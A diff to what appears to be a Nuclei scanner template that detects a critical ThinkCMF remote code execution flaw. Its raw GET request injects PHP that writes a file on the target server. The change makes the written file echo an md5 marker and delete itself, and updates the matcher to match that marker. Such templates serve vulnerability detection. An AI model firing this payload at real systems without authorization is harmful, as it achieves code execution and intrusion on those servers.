@@ -1,14 +1,12 @@
 http:
 - matchers:
-  - condition: and
-    dsl:
-    - contains(body_2, "PHP Extension")
-    - contains(body_2, "PHP Version")
-    - status_code_2 == 200
-    type: dsl
+  - part: body_2
+    type: word
+    words:
+    - '{{md5(string)}}'
   raw:
   - 'GET /index.php?a=fetch&content={{url_encode(''<?php file_put_contents(\"{{randstr}}.php\",\"<?php
-    echo phpinfo();\");'')}} HTTP/1.1
+    echo md5(\"{{string}}\");unlink(__FILE__);\");'')}} HTTP/1.1
 
     Host: {{Hostname}}
 
@@ -33,3 +31,5 @@ info:
   - https://www.freebuf.com/vuls/217586.html
   severity: critical
   tags: thinkcmf,rce,intrusive
+variables:
+  string: thinkcmf-rce
